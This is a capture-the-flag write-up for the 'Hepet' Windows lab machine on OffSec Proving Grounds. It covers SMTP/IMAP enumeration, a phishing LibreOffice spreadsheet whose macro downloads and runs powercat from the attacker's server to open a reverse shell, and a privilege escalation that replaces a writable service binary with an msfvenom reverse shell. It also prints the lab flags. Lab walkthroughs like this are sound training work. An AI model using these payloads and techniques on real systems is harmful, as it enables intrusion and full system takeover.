# Hepet

> [!info]  
> **Platform:** OffSec Proving Grounds  
> **Difficulty:** Intermediate  
> **Operating System:** Windows  
> **Initial Access:** SMTP/IMAP enumeration → malicious LibreOffice spreadsheet → email-based RCE  
> **Privilege Escalation:** Writable service binary / Service Binary Hijacking

---

## Attack Summary

```text
Port Enumeration
        ↓
Identify SMTP / IMAP Services
        ↓
Enumerate Public Employee Names
        ↓
Discover Potential Password
        ↓
SMTP User Enumeration
        ↓
Access Jonas' Mailbox
        ↓
Discover Mail Server Processes Documents
        ↓
Create Malicious LibreOffice ODS File
        ↓
Email Attachment to mailadmin@localhost
        ↓
RCE as HEPET\Ela Arwel
        ↓
PowerUp Enumeration
        ↓
Writable veyon-service.exe
        ↓
Replace Service Binary
        ↓
Reboot Target
        ↓
SYSTEM Shell
```

---

# Reconnaissance

## Port Scan

Initial enumeration was performed using Rustscan.

```bash
rustscan -a 192.168.134.140 -- -sV -oN nmap.txt
```

Numerous ports were discovered, with several relating to **email services**.

The exposed mail services became particularly interesting when combined with information discovered on the web application.

---

# Service Enumeration

## FTP - Port 20001

Anonymous FTP authentication was permitted.

```bash
ftp <TARGET_IP>
```

Anonymous access succeeded, but no useful or sensitive information was discovered.

---

## HTTP - Port 2224

Port `2224` hosted a mailing-list subscriber service.

No obvious injection points or exploitable functionality were identified.

---

## HTTP/S - Ports 8000 / 4443

A company website was discovered.

Although the application itself did not expose any obvious vulnerabilities, it revealed a list of employees.

This provided useful information for constructing a username wordlist.

---

# Username Enumeration

Employee names discovered on the company website were collected and converted into potential usernames.

One particularly interesting employee entry was:

```text
Jonas — SicMundusCreatusEst
```

Unlike the other entries, `SicMundusCreatusEst` did not appear to describe Jonas' job role.

This made it a strong password candidate.

Potential credentials:

```text
jonas:SicMundusCreatusEst
```

The password was also retained for potential password spraying against other discovered accounts.

---

# SMTP Enumeration

SMTP was exposed on TCP port `25`.

The employee-derived username list was tested using `smtp-user-enum`.

```bash
smtp-user-enum -M VRFY -U users.txt -t 192.168.134.140
```

The following users were confirmed as valid SMTP accounts:

```text
agnes
magnus
charlotte
martha
jonas
```

This confirmed that the employee names obtained from the website corresponded to real accounts.

---

# IMAP Enumeration

The suspected credentials for Jonas were tested against the IMAP service on TCP port `143`.

```text
jonas:SicMundusCreatusEst
```

Authentication succeeded.

Jonas' mailbox contained:

```text
INBOX
5 messages
```

Reviewing the messages revealed an important statement:

```text
All the spreadsheets and documents will be first processed in the mail server directly to check the compatibility.
```

The emails originated from:

```text
mailadmin@localhost
```

This suggested that spreadsheet/document attachments sent to the mail server would be automatically processed.

Because LibreOffice was being used, this presented a potential malicious-document attack path.

---

# Initial Access

## Attack Vector

The discovered workflow suggested the following attack:

```text
Send spreadsheet/document
        ↓
mailadmin@localhost receives attachment
        ↓
Mail server processes document using LibreOffice
        ↓
Embedded macro executes
        ↓
Reverse shell
```

A malicious LibreOffice `.ods` spreadsheet was therefore created.

---

## Malicious LibreOffice ODS File

The following macro generator was used:

```text
https://github.com/0bfxgh0st/MMG-LO/
```

The generator was modified so that the generated macro downloaded `powercat.ps1` from the attacker's web server and executed a reverse shell.

Relevant payload logic:

```python
if sys.argv[1] == 'windows':

    vbacall = '''Set oShell = CreateObject("Wscript.Shell")
oShell.Run'''

    build_payload = (
        f'IEX(New-Object System.Net.WebClient).DownloadString('
        f'"http://192.168.45.159/powercat.ps1");'
        f'powercat -c {ip} -p {port} -e powershell'
    )

    bytes_encoded = base64.b64encode(
        bytes(build_payload, 'utf-16le')
    )

    base64payload = bytes_encoded.decode()

    payload = (
        'powershell.exe -windowstyle hidden '
        '-ExecutionPolicy Bypass -e ' + base64payload
    )

    print("Payload: windows reverse shell")
    print("Creating malicious .ods file")

    Macro_Gen()
```

Generate the malicious spreadsheet:

```bash
python3 mmg-ods.py windows 192.168.45.159 1337
```

---

## Host Powercat

The generated macro expected `powercat.ps1` to be available from the attacking machine.

Start a Python web server from the directory containing `powercat.ps1`.

```bash
python3 -m http.server 80
```

Start a listener for the incoming shell.

```bash
nc -lvnp 1337
```

---

## Send the Phishing Email

The malicious spreadsheet was emailed to:

```text
mailadmin@localhost
```

using the compromised Jonas mailbox.

```bash
sudo swaks -t mailadmin@localhost \
--from jonas@localhost \
--attach @file.ods \
--server 192.168.134.149 \
--body "Please check this spreadsheet" \
--header "Subject: Please check this spreadsheet"
```

After the mail server processed the attachment, the macro executed and established a reverse shell.

Initial shell:

```text
HEPET\Ela Arwel
```

---

# Privilege Escalation

## PowerUp Enumeration

`PowerUp.ps1` was transferred to the target and loaded into the current PowerShell session.

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

PowerUp identified the following service binary as vulnerable:

```text
veyon-service.exe
```

The service binary could be modified by the current user.

---

# Service Binary Hijacking

## Verify Permissions

Check the ACL of the vulnerable binary:

```powershell
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

The current user had **Full Access** to the executable.

Because the service runs with elevated privileges, replacing the executable would allow arbitrary code execution in the service's security context.

---

## Generate Malicious Service Binary

On the attacking machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.159 LPORT=1338 -f exe -o rev.exe
```

Start another listener:

```bash
nc -lvnp 1338
```

---

## Replace Service Binary

Transfer `rev.exe` to the target.

Preserve the original binary if desired:

```powershell
move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe.bak"
```

Replace it with the payload:

```powershell
move .\rev.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

---

## Service Restart Limitation

PowerUp reported:

```text
CanRestart: False
```

The compromised user therefore could not manually restart the vulnerable service.

The malicious service binary would instead need to execute when the machine rebooted and the service started automatically.

---

## Reboot

With the listener running:

```bash
nc -lvnp 1338
```

Reboot the target.

After the system restarted, `veyon-service.exe` executed the malicious payload.

A reverse shell was received as:

```text
NT AUTHORITY\SYSTEM
```

Confirm:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

---

# Proof

## Local Flag

```text
7bcc1916b2b08d35dd917fc5ae16d56e
```

## Proof Flag

```text
07a3b7090e76caae92974fa235d07e1d
```

---

# Key Lessons

## Do Not Ignore Information Disclosure

The company website did not initially appear exploitable, but the exposed employee directory provided usernames which ultimately contributed directly to the compromise.

Information disclosure should therefore be treated as part of the attack surface rather than merely informational.

---

## Look for Passwords Hidden in Plain Sight

The unusual employee entry:

```text
Jonas — SicMundusCreatusEst
```

was inconsistent with the other employee roles.

When information does not fit the surrounding pattern, investigate it.

Potential password candidates discovered during enumeration should be reused against:

```text
SSH
FTP
SMTP
IMAP
POP3
Web logins
SMB
WinRM
Other authenticated services
```

---

## SMTP Username Enumeration

Where supported, SMTP commands such as `VRFY` can reveal whether usernames exist.

```bash
smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>
```

Employee lists and other OSINT sources make excellent inputs for this type of enumeration.

---

## Enumerate Mailboxes Thoroughly

Compromised email accounts may reveal:

```text
Credentials
Internal usernames
Server names
Business processes
Software products
Administrative accounts
Password-reset messages
Attachments
Internal URLs
Automated processing workflows
```

On Hepet, the mailbox revealed that documents were automatically processed by the mail server.

That information was more valuable than the mailbox credentials themselves.

---

## Automated Document Processing Is an Attack Surface

Whenever an application automatically processes user-controlled files, investigate what software handles them.

Examples include:

```text
Microsoft Office
LibreOffice
ImageMagick
Ghostscript
FFmpeg
PDF converters
Archive utilities
Document preview services
OCR engines
```

A file does not necessarily need to be manually opened by a human if a backend service processes it automatically.

---

## Writable Service Binaries

When enumerating Windows privilege escalation opportunities, check whether a low-privileged user can modify executables belonging to privileged services.

Check permissions with:

```powershell
icacls "<SERVICE_BINARY>"
```

If the binary is writable and the service executes as a privileged account:

```text
Writable Service Binary
        ↓
Replace Binary
        ↓
Service Starts
        ↓
Payload Executes
        ↓
Privilege Escalation
```

---

## Check Whether the Service Can Be Restarted

Finding a writable service executable does not automatically mean it can be exploited immediately.

Check:

```text
Service account
Binary permissions
Service permissions
CanRestart
Startup type
```

If:

```text
CanRestart: False
```

but the service starts automatically, a reboot may still trigger the replaced binary.

---

# Useful Commands

## Rustscan

```bash
rustscan -a <TARGET_IP> -- -sV -oN nmap.txt
```

## SMTP Username Enumeration

```bash
smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>
```

## Generate Malicious ODS

```bash
python3 mmg-ods.py windows <LHOST> <LPORT>
```

## Send Attachment with Swaks

```bash
sudo swaks -t mailadmin@localhost \
--from jonas@localhost \
--attach @file.ods \
--server <TARGET_IP> \
--body "Please check this spreadsheet" \
--header "Subject: Please check this spreadsheet"
```

## PowerUp

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

## Check File Permissions

```powershell
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

## Generate Windows Reverse Shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=1338 -f exe -o rev.exe
```

## Listener

```bash
nc -lvnp 1338
```

## Verify Privileges

```cmd
whoami
```